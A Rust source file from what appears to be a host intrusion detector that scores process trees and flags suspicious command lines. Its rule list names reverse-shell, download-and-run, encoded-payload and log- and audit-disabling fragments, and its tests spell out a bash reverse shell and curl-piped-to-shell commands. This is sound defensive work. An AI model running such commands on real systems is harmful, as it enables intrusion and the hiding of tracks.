//! Process creation chains: per-process tree features (parent and child image,
//! depth, command-line length, entropy and complexity) plus rule hits for
//! unusual parent-child pairs and suspicious command lines, including defense evasion.

use std::collections::HashMap;
use std::io;
use std::path::Path;

use crate::core::event::{Event, EventKind};
use crate::core::framework::Processor;

/// Programs that open untrusted content: browsers, office suites, viewers, mail clients.
const CONTENT_APPS: &[&str] = &[
    "firefox", "firefox-esr", "chrome", "chromium", "google-chrome", "brave", "msedge", "opera",
    "vivaldi-bin", "epiphany", "soffice.bin", "libreoffice", "evince", "okular", "zathura",
    "thunderbird", "evolution",
];

/// Shells and script interpreters.
const INTERPRETERS: &[&str] = &[
    "sh", "bash", "dash", "zsh", "fish", "ksh", "csh", "tcsh", "busybox", "pwsh", "python", "perl",
    "ruby", "php", "node", "lua",
];

/// Download, network and decoding tools.
const TOOLS: &[&str] = &["curl", "wget", "nc", "ncat", "netcat", "socat", "base64", "openssl"];

/// Fragments of download-and-run, reverse shells, encoded payloads and defense
/// evasion, matched as whole words in the normalized command line.
// ponytail: fixed fragments are evaded by quoting or variables; the entropy
// feature and a learned model are what should catch obfuscation.
const CMDLINE_RULES: &[(&str, &str)] = &[
    ("$(curl", "download and run"),
    ("$(wget", "download and run"),
    ("base64 -d", "base64 decode"),
    ("base64 --decode", "base64 decode"),
    ("frombase64string", "base64 decode"),
    ("-encodedcommand", "encoded powershell"),
    ("/dev/tcp/", "reverse shell"),
    ("/dev/udp/", "reverse shell"),
    ("nc -e", "reverse shell"),
    ("ncat -e", "reverse shell"),
    ("socat exec:", "reverse shell"),
    ("bash -i", "interactive shell"),
    ("chmod +x /tmp/", "run from temp"),
    ("chmod +x /dev/shm/", "run from temp"),
    ("history -c", "clear history"),
    ("unset histfile", "disable history"),
    ("histfile=/dev/null", "disable history"),
    ("rm -rf /var/log", "delete logs"),
    ("journalctl --vacuum", "delete logs"),
    ("setenforce 0", "disable selinux"),
    ("auditctl -d", "delete audit rules"),
    ("auditctl -e 0", "disable audit"),
    ("stop auditd", "stop audit"),
    ("iptables -f", "flush firewall"),
    ("ufw disable", "disable firewall"),
    ("ld_preload=", "preload hijack"),
    ("ld.so.preload", "preload hijack"),
];

/// Per-process features after Yoon et al., "Structure-Aware Malicious Behavior
/// Detection through 2D Spatio-Temporal Modeling of Process Hierarchies" (2025),
/// Table 2: file paths give [depth, file-name complexity], other strings
/// [length, complexity].
#[derive(Debug, Clone, Default, PartialEq)]
pub struct ProcessTreeFeatures {
    pub pid: u32,
    pub ppid: u32,
    /// Lowercased executable file name, or the process name if unreadable.
    pub image: String,
    /// Directories above the executable (/usr/bin/bash: 2); 0 if unreadable.
    pub image_depth: u32,
    /// `log_complexity` of the executable file name.
    pub image_complexity: f64,
    /// Empty when the parent was never seen.
    pub parent_image: String,
    /// Known ancestors: 0 for init or when the parent was never seen.
    pub depth: u32,
    pub cmdline: String,
    /// Characters in the command line.
    pub cmdline_len: u32,
    /// Shannon entropy of the command line in bits per character; the plain
    /// baseline the paper lists as missing from its ablation.
    pub cmdline_entropy: f64,
    /// `log_complexity` of the command line.
    pub cmdline_complexity: f64,
    pub start_ticks: u64,
    /// Rule hits since the process was first seen; empty if nothing looked suspicious.
    pub alerts: Vec<String>,
}

/// Builds process-tree features for every running process.
#[derive(Default)]
pub struct ProcessTreeExtractor {
    procs: HashMap<u32, ProcessTreeFeatures>,
}

impl ProcessTreeExtractor {
    pub fn new() -> Self {
        Self::default()
    }

    pub fn get(&self, pid: u32) -> Option<&ProcessTreeFeatures> {
        self.procs.get(&pid)
    }

    /// Every known running process, sorted by pid.
    pub fn snapshot(&self) -> Vec<ProcessTreeFeatures> {
        let mut v: Vec<_> = self.procs.values().cloned().collect();
        v.sort_unstable_by_key(|p| p.pid);
        v
    }
}

impl ProcessTreeFeatures {
    /// New program image and command line. With `judge`, add any new rule hits.
    fn set_program(&mut self, name: &str, exe: Option<&Path>, cmdline: &str, judge: bool) {
        self.image = image(name, exe);
        self.image_depth = exe.and_then(Path::parent).map_or(0, |d| d.components().count().saturating_sub(1) as u32);
        self.image_complexity = log_complexity(&self.image);
        self.cmdline = cmdline.to_string();
        self.cmdline_len = cmdline.chars().count() as u32;
        self.cmdline_entropy = shannon_entropy(cmdline);
        self.cmdline_complexity = log_complexity(cmdline);
        if !judge {
            return;
        }
        let mut hits = Vec::new();
        if is_any(&self.parent_image, CONTENT_APPS) && (is_any(&self.image, INTERPRETERS) || is_any(&self.image, TOOLS)) {
            hits.push(format!("{} -> {}", self.parent_image, self.image));
        }
        hits.extend(cmdline_rules(cmdline).into_iter().map(String::from));
        for h in hits {
            if !self.alerts.contains(&h) {
                self.alerts.push(h);
            }
        }
    }
}

impl Processor for ProcessTreeExtractor {
    fn on_event(&mut self, ev: &Event, _out: &mut Vec<Event>) -> io::Result<()> {
        match &ev.kind {
            EventKind::ProcessStart { name, exe, start_ticks, ppid, cmdline } => {
                let parent = self.procs.get(ppid);
                // A fork that has not exec'd yet runs its parent's program, which
                // was already judged; judging it again would repeat its alerts.
                let judge = !parent.is_some_and(|p| p.image == image(name, exe.as_deref()) && p.cmdline == *cmdline);
                let mut f = ProcessTreeFeatures {
                    pid: ev.pid,
                    ppid: *ppid,
                    parent_image: parent.map_or_else(String::new, |p| p.image.clone()),
                    depth: parent.map_or(0, |p| p.depth + 1),
                    start_ticks: *start_ticks,
                    ..Default::default()
                };
                f.set_program(name, exe.as_deref(), cmdline, judge);
                self.procs.insert(ev.pid, f);
            }
            EventKind::ProcessExec { name, exe, cmdline } => {
                if let Some(f) = self.procs.get_mut(&ev.pid) {
                    f.set_program(name, exe.as_deref(), cmdline, true);
                }
            }
            EventKind::ProcessExit => {
                self.procs.remove(&ev.pid);
            }
            EventKind::File { .. } => {}
        }
        Ok(())
    }
}

fn image(name: &str, exe: Option<&Path>) -> String {
    exe.and_then(Path::file_name).map_or_else(|| name.to_lowercase(), |f| f.to_string_lossy().to_lowercase())
}

/// `image` is one of `names`, ignoring a version suffix (python3.12, php8).
fn is_any(image: &str, names: &[&str]) -> bool {
    names.iter().any(|n| {
        image.strip_prefix(n).is_some_and(|rest| rest.chars().all(|c| c.is_ascii_digit() || c == '.'))
    })
}

/// Labels of the command-line rules that `cmdline` hits.
fn cmdline_rules(cmdline: &str) -> Vec<&'static str> {
    // Lowercase, single spaces, none around pipes.
    let norm = cmdline.to_lowercase().split_whitespace().collect::<Vec<_>>().join(" ");
    let norm = norm.replace(" |", "|").replace("| ", "|");
    let mut hits: Vec<&str> = CMDLINE_RULES.iter().filter(|(pat, _)| contains_word(&norm, pat)).map(|(_, l)| *l).collect();
    // `... | sh`, `... | sudo python3`: whatever runs after a pipe is an interpreter.
    let piped_to_interpreter = norm.split('|').skip(1).any(|seg| {
        let mut words = seg.split(' ').skip_while(|w| *w == "sudo");
        words.next().is_some_and(|w| is_any(w.rsplit('/').next().unwrap_or(w), INTERPRETERS))
    });
    if piped_to_interpreter {
        hits.push("pipe to interpreter");
    }
    hits.dedup();
    hits
}

/// `pat` occurs in `s` without being glued to a longer word on either side
/// ("| sh" must not match "| sha256sum").
fn contains_word(s: &str, pat: &str) -> bool {
    let (first, last) = (pat.chars().next().unwrap(), pat.chars().last().unwrap());
    s.match_indices(pat).any(|(i, _)| {
        let before = s[..i].chars().next_back();
        let after = s[i + pat.len()..].chars().next();
        let open = !first.is_alphanumeric() || !before.is_some_and(char::is_alphanumeric);
        let close = !last.is_alphanumeric() || !after.is_some_and(|c| c.is_alphabetic() || c == '_');
        open && close
    })
}

/// Shannon entropy in bits per character.
pub fn shannon_entropy(s: &str) -> f64 {
    let mut chars: Vec<char> = s.chars().collect();
    chars.sort_unstable();
    let n = chars.len() as f64;
    chars.chunk_by(|a, b| a == b).map(|run| run.len() as f64 / n).map(|p| -p * p.log2()).sum()
}

/// String complexity, Eq. (1) of the paper: Shannon entropy × e^k, where k counts
/// changes between character classes (upper, lower, digit, special, other) along
/// the string. Returned as ln(1 + complexity): e^k overflows f64 past k = 709,
/// which a base64 payload of about 1 KB already reaches.
pub fn log_complexity(s: &str) -> f64 {
    let class = |c: char| match c {
        'A'..='Z' => 0,
        'a'..='z' => 1,
        '0'..='9' => 2,
        c if c.is_ascii() => 3,
        _ => 4,
    };
    let k = s.chars().zip(s.chars().skip(1)).filter(|&(a, b)| class(a) != class(b)).count() as f64;
    let h = shannon_entropy(s);
    if h == 0.0 {
        return 0.0;
    }
    // ln(1 + e^x) with x = ln(h) + k, without computing e^k.
    let x = h.ln() + k;
    x.max(0.0) + (-x.abs()).exp().ln_1p()
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::path::PathBuf;
    use std::time::SystemTime;

    fn ev(pid: u32, kind: EventKind) -> Event {
        Event { timestamp: SystemTime::now(), pid, kind }
    }
    fn start(pid: u32, ppid: u32, exe: &str, cmdline: &str) -> Event {
        let name = exe.rsplit('/').next().unwrap().to_string();
        let exe = Some(PathBuf::from(exe));
        ev(pid, EventKind::ProcessStart { name, exe, start_ticks: pid.into(), ppid, cmdline: cmdline.into() })
    }
    fn exec(pid: u32, exe: &str, cmdline: &str) -> Event {
        let name = exe.rsplit('/').next().unwrap().to_string();
        ev(pid, EventKind::ProcessExec { name, exe: Some(PathBuf::from(exe)), cmdline: cmdline.into() })
    }

    #[test]
    fn browser_forking_then_execing_a_shell_is_flagged_once() {
        let mut x = ProcessTreeExtractor::new();
        let ff = "/usr/lib/firefox/firefox";
        let events = [
            start(1, 0, "/usr/lib/systemd/systemd", "/sbin/init"),
            start(10, 1, ff, ff),
            start(11, 10, ff, ff), // fork, not exec'd yet: same program as the parent
            exec(11, "/usr/bin/bash", "bash -c curl -s http://x | sh"),
            exec(11, "/usr/bin/bash", "bash -c curl -s http://x | sh"),
            start(12, 11, "/usr/bin/curl", "curl -s http://x"),
        ];
        for e in &events {
            x.on_event(e, &mut Vec::new()).unwrap();
        }
        let f = |pid| x.get(pid).unwrap();
        assert!(f(10).alerts.is_empty() && f(11).depth == 2);
        assert_eq!((f(11).parent_image.as_str(), f(11).image.as_str(), f(11).image_depth), ("firefox", "bash", 2));
        assert_eq!(f(11).alerts, ["firefox -> bash", "pipe to interpreter"]);
        assert_eq!((f(12).depth, f(12).parent_image.as_str()), (3, "bash"));
        assert!(f(12).alerts.is_empty(), "{:?}", f(12).alerts);

        x.on_event(&ev(11, EventKind::ProcessExit), &mut Vec::new()).unwrap();
        assert!(x.get(11).is_none());
        // An orphan keeps the chain it was started in.
        assert_eq!(x.get(12).unwrap().depth, 3);
    }

    #[test]
    fn command_line_rules() {
        let cases: &[(&str, &[&str])] = &[
            ("ls -la /home", &[]),
            ("sh -c cat a | sha256sum", &[]),
            ("sh -c curl -fsSL http://x/i.sh |   SH", &["pipe to interpreter"]),
            ("sh -c wget -qO- x | sudo /usr/bin/python3 -", &["pipe to interpreter"]),
            ("sh -c echo aGk= | /usr/bin/base64 -d | bash", &["base64 decode", "pipe to interpreter"]),
            ("bash -c bash -i >& /dev/tcp/10.0.0.1/4444 0>&1", &["reverse shell", "interactive shell"]),
            ("bash -c history -c; unset HISTFILE", &["clear history", "disable history"]),
            ("sudo setenforce 0", &["disable selinux"]),
            ("rbash -i; bash -id", &[]),
        ];
        for (cmd, want) in cases {
            assert_eq!(cmdline_rules(cmd), *want, "{cmd}");
        }
    }

    #[test]
    fn version_suffixes_match_but_longer_names_do_not() {
        assert!(is_any("python3.12", INTERPRETERS) && is_any("sh", INTERPRETERS));
        assert!(!is_any("sha256sum", INTERPRETERS) && !is_any("shellcheck", INTERPRETERS));
    }

    #[test]
    fn entropy_rises_with_randomness() {
        assert_eq!(shannon_entropy(""), 0.0);
        assert_eq!(shannon_entropy("aaaa"), 0.0);
        assert_eq!(shannon_entropy("abab"), 1.0);
        let plain = "systemctl --user restart pipewire.service";
        let encoded = "powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBi";
        assert!(shannon_entropy(encoded) > shannon_entropy(plain) + 0.5);
        assert!(log_complexity(encoded) > log_complexity(plain) + 20.0);
    }

    #[test]
    fn complexity_follows_equation_1_without_overflow() {
        assert_eq!((log_complexity(""), log_complexity("aaaa")), (0.0, 0.0));
        // H = log2(3), k = 2 (lower -> upper -> digit).
        let want = (1.0 + 3f64.log2() * 2f64.exp()).ln();
        assert!((log_complexity("aB1") - want).abs() < 1e-12);
        // H = 1, k = 1999: e^k is not representable, its logarithm is.
        assert!((log_complexity(&"aB".repeat(1000)) - 1999.0).abs() < 1e-9);
    }
}
